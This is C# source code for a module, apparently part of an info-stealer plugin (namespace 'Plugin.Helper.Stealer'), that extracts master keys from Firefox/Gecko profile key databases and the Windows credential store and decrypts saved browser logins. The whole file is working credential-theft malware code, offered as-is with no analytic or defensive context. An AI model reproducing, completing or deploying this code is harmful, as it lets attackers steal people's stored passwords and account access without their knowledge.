

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;


namespace Plugin.Helper.Stealer
{
	public class GeckoDecryptor
	{
		public static string Decrypt(string profilePath, byte[] EncryptedData)
		{
			string path1 = Path.Combine(profilePath, "key3.db");
			string path2 = Path.Combine(profilePath, "key4.db");
			byte[] key;
			if (File.Exists(path1))
			{
				key = GeckoDecryptor.GetMasterKeyFromKey3(path1);
			}
			else
			{
				if (!File.Exists(path2))
					return (string) null;
				key = GeckoDecryptor.GetMasterKeyFromKey4(path2);
			}
			ASN1DER.ASN1DERObject asN1DerObject = ASN1DER.Parse(EncryptedData);
			byte[] data1 = asN1DerObject.objects?[0].objects?[1].objects?[1].data;
			byte[] data2 = asN1DerObject.objects?[0].objects?[2].data;
			if (data1 == null || data2 == null)
				return (string) null;
			string input = TripleDES.DecryptStringDesCbc(key, data1, data2);
			return input == null ? (string) null : Regex.Replace(input, "[^ -\u007F]", "");
		}

		public static string DecryptBase64(string profilePath, string cypherText)
		{
			if (cypherText == null)
				return (string) null;
			byte[] EncryptedData;
			try
			{
				EncryptedData = Convert.FromBase64String(cypherText);
			}
			catch
			{
				return (string) null;
			}
			return GeckoDecryptor.Decrypt(profilePath, EncryptedData);
		}

		private static bool ASNContainsBytes(ASN1DER.ASN1DERObject data, byte[] BytesToMatch)
		{
			if (data.data != null)
				return Utils.CompareByteArrays(data.data, BytesToMatch);
			foreach (ASN1DER.ASN1DERObject data1 in data.objects)
			{
				if (GeckoDecryptor.ASNContainsBytes(data1, BytesToMatch))
					return true;
			}
			return false;
		}

		private static byte[] GetMasterKeyFromKey4(string path)
		{
			byte[] db_bytes = Utils.ForceReadFile(path);
			if (db_bytes == null)
				return (byte[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (byte[]) null;
			}
			if (!sqlLite3Parser.ReadTable("metaData"))
				return (byte[]) null;
			bool flag = false;
			byte[] globalSalt = (byte[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				if (sqlLite3Parser.GetValue<string>(index, "id") != null)
				{
					globalSalt = sqlLite3Parser.GetValue<byte[]>(index, "item1");
					byte[] ASN1DERData = sqlLite3Parser.GetValue<byte[]>(index, "item2");
					if (globalSalt != null && ASN1DERData != null)
					{
						ASN1DER.ASN1DERObject data1 = ASN1DER.Parse(ASN1DERData);
						byte[] BytesToMatch1 = new byte[11]
						{
							(byte) 42,
							(byte) 134,
							(byte) 72,
							(byte) 134,
							(byte) 247,
							(byte) 13,
							(byte) 1,
							(byte) 12,
							(byte) 5,
							(byte) 1,
							(byte) 3
						};
						byte[] BytesToMatch2 = new byte[9]
						{
							(byte) 42,
							(byte) 134,
							(byte) 72,
							(byte) 134,
							(byte) 247,
							(byte) 13,
							(byte) 1,
							(byte) 5,
							(byte) 13
						};
						if (GeckoDecryptor.ASNContainsBytes(data1, BytesToMatch1))
						{
							byte[] data2 = data1.objects?[0].objects?[0].objects?[1].objects?[0].data;
							byte[] data3 = data1.objects?[0].objects?[1].data;
							if (data2 != null && data3 != null)
							{
								byte[] bytes = TripleDES.DecryptByteDesCbc(globalSalt, (byte[]) null, data2, data3);
								if (bytes != null)
								{
									string str = "password-check";
									if (!(Encoding.GetEncoding("ISO-8859-1").GetString(bytes, 0, str.Length) != str))
									{
										flag = true;
										break;
									}
								}
							}
						}
						else if (GeckoDecryptor.ASNContainsBytes(data1, BytesToMatch2))
						{
							byte[] data4 = data1.objects?[0].objects?[0].objects?[1].objects?[0].objects?[1].objects?[0].data;
							byte[] data5 = data1.objects?[0].objects?[0].objects?[1].objects?[2].objects?[1].data;
							byte[] data6 = data1.objects?[0].objects?[0].objects?[1].objects?[3].data;
							if (data4 != null && data5 != null && data6 != null)
							{
								byte[] bytes = PasswordBasedDecryption.Decrypt(data6, globalSalt, (byte[]) null, data4, data5);
								if (bytes != null)
								{
									string str = "password-check";
									if (!(Encoding.GetEncoding("ISO-8859-1").GetString(bytes, 0, str.Length) != str))
									{
										flag = true;
										break;
									}
								}
							}
						}
					}
				}
			}
			if (!flag)
				return (byte[]) null;
			if (!sqlLite3Parser.ReadTable("nssPrivate"))
				return (byte[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				byte[] ASN1DERData = sqlLite3Parser.GetValue<byte[]>(index, "a11");
				if (ASN1DERData != null)
				{
					ASN1DER.ASN1DERObject asN1DerObject = ASN1DER.Parse(ASN1DERData);
					byte[] data7 = asN1DerObject.objects?[0].objects?[0].objects?[1].objects?[0].objects?[1].objects?[0].data;
					byte[] data8 = asN1DerObject.objects?[0].objects?[0].objects?[1].objects?[2].objects?[1].data;
					byte[] data9 = asN1DerObject.objects?[0].objects?[0].objects?[1].objects?[3].data;
					if (data7 != null && data8 != null && data9 != null)
					{
						byte[] sourceArray = PasswordBasedDecryption.Decrypt(data9, globalSalt, (byte[]) null, data7, data8);
						if (sourceArray != null)
						{
							byte[] destinationArray = new byte[24];
							if (destinationArray.Length <= sourceArray.Length)
							{
								Array.Copy((Array) sourceArray, (Array) destinationArray, destinationArray.Length);
								return destinationArray;
							}
						}
					}
				}
			}
			return (byte[]) null;
		}

		private static T GetFirstItemFromKeyValuePairList<T>(
			KeyValuePair<string, T>[] keyValuePairs,
			string key)
		{
			foreach (KeyValuePair<string, T> keyValuePair in keyValuePairs)
			{
				if (keyValuePair.Key == key)
					return keyValuePair.Value;
			}
			return default (T);
		}

		private static bool KeyValuePairListContainsKey<T>(
			KeyValuePair<string, T>[] keyValuePairs,
			string key)
		{
			foreach (KeyValuePair<string, T> keyValuePair in keyValuePairs)
			{
				if (keyValuePair.Key == key)
					return true;
			}
			return false;
		}

		private static byte[] GetMasterKeyFromKey3(string path)
		{
			byte[] fileBytes = Utils.ForceReadFile(path);
			if (fileBytes == null)
				return (byte[]) null;
			KeyValuePair<string, byte[]>[] keyValuePairs = BerkelyParser.Parse(fileBytes);
			if (!GeckoDecryptor.KeyValuePairListContainsKey<byte[]>(keyValuePairs, "password-check") || !GeckoDecryptor.KeyValuePairListContainsKey<byte[]>(keyValuePairs, "global-salt"))
				return (byte[]) null;
			byte[] keyValuePairList1 = GeckoDecryptor.GetFirstItemFromKeyValuePairList<byte[]>(keyValuePairs, "password-check");
			byte[] keyValuePairList2 = GeckoDecryptor.GetFirstItemFromKeyValuePairList<byte[]>(keyValuePairs, "global-salt");
			int length = (int) keyValuePairList1[1];
			byte[] numArray1 = new byte[length];
			Array.Copy((Array) keyValuePairList1, 3, (Array) numArray1, 0, length);
			int num = keyValuePairList1.Length - (3 + length + 18);
			int sourceIndex = 3 + length + 2 + num;
			byte[] numArray2 = new byte[keyValuePairList1.Length - sourceIndex];
			Array.Copy((Array) keyValuePairList1, sourceIndex, (Array) numArray2, 0, numArray2.Length);
			byte[] bytes = TripleDES.DecryptByteDesCbc(keyValuePairList2, (byte[]) null, numArray1, numArray2);
			if (bytes == null)
				return (byte[]) null;
			string str = "password-check";
			if (Encoding.GetEncoding("ISO-8859-1").GetString(bytes, 0, str.Length) != str)
				return (byte[]) null;
			byte[] ASN1DERData1 = (byte[]) null;
			foreach (KeyValuePair<string, byte[]> keyValuePair in keyValuePairs)
			{
				if (keyValuePair.Key.ToLower() != "password-check" && keyValuePair.Key.ToLower() != "global-salt" && keyValuePair.Key.ToLower() != "version")
				{
					ASN1DERData1 = keyValuePair.Value;
					break;
				}
			}
			if (ASN1DERData1 == null)
				return (byte[]) null;
			ASN1DER.ASN1DERObject asN1DerObject1 = ASN1DER.Parse(ASN1DERData1);
			byte[] data1 = asN1DerObject1.objects?[0].objects?[0].objects?[1].objects?[0].data;
			byte[] data2 = asN1DerObject1.objects?[0].objects?[1].data;
			if (data2 == null || data1 == null)
				return (byte[]) null;
			byte[] ASN1DERData2 = TripleDES.DecryptByteDesCbc(keyValuePairList2, (byte[]) null, data1, data2);
			if (ASN1DERData2 == null)
				return (byte[]) null;
			byte[] data3 = ASN1DER.Parse(ASN1DERData2).objects?[0].objects?[2].data;
			if (data3 == null)
				return (byte[]) null;
			ASN1DER.ASN1DERObject asN1DerObject2 = ASN1DER.Parse(data3);
			byte[] destinationArray = new byte[24];
			byte[] data4 = asN1DerObject2.objects?[0].objects?[3].data;
			if (data4 == null)
				return (byte[]) null;
			if (data4.Length > destinationArray.Length)
				Array.Copy((Array) data4, data4.Length - destinationArray.Length, (Array) destinationArray, 0, destinationArray.Length);
			else
				destinationArray = data4;
			return destinationArray;
		}

		private static byte[] GetOsKeyStoreKey(string MOZAPPBASENAME)
		{
			IntPtr credentialPtr;
			if (!NativeMethods.CredReadW(MOZAPPBASENAME + " Encrypted Storage", InternalStructs.CRED_TYPE.GENERIC, 0, out credentialPtr))
				return (byte[]) null;
			InternalStructs.CREDENTIALW structure = Marshal.PtrToStructure<InternalStructs.CREDENTIALW>(credentialPtr);
			byte[] destination = new byte[structure.credentialBlobSize];
			Marshal.Copy(structure.credentialBlob, destination, 0, destination.Length);
			NativeMethods.CredFree(credentialPtr);
			return destination;
		}

		public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, byte[] EncryptedData)
		{
			byte[] osKeyStoreKey = GeckoDecryptor.GetOsKeyStoreKey(MOZAPPBASENAME);
			if (osKeyStoreKey == null)
				return (byte[]) null;
			byte[] numArray1 = new byte[12];
			Array.Copy((Array) EncryptedData, 0, (Array) numArray1, 0, 12);
			int length1 = EncryptedData.Length - 12;
			byte[] numArray2 = new byte[length1];
			Array.Copy((Array) EncryptedData, 12, (Array) numArray2, 0, length1);
			int length2 = 16;
			byte[] numArray3 = new byte[length2];
			byte[] numArray4 = new byte[length1 - length2];
			Array.Copy((Array) numArray2, length1 - length2, (Array) numArray3, 0, length2);
			Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, length1 - length2);
			return AesGcm.Decrypt(osKeyStoreKey, numArray1, (byte[]) null, numArray4, numArray3);
		}

		public static byte[] OsKeyStoreDecrypt(string MOZAPPBASENAME, string cypherText)
		{
			try
			{
				return GeckoDecryptor.OsKeyStoreDecrypt(MOZAPPBASENAME, Convert.FromBase64String(cypherText));
			}
			catch
			{
			}
			return (byte[]) null;
		}

		public static string GetMOZAPPBASENAMEFromProfilePath(string profilePath)
		{
			string directoryRoot = Directory.GetDirectoryRoot(profilePath);
			for (; !File.Exists(Path.Combine(profilePath, "profiles.ini")); profilePath = Path.GetFullPath(profilePath))
			{
				if (string.Equals(profilePath, directoryRoot, StringComparison.OrdinalIgnoreCase))
					return (string) null;
				profilePath = Path.Combine(profilePath, "..");
			}
			return new DirectoryInfo(profilePath).Name;
		}
	}
}
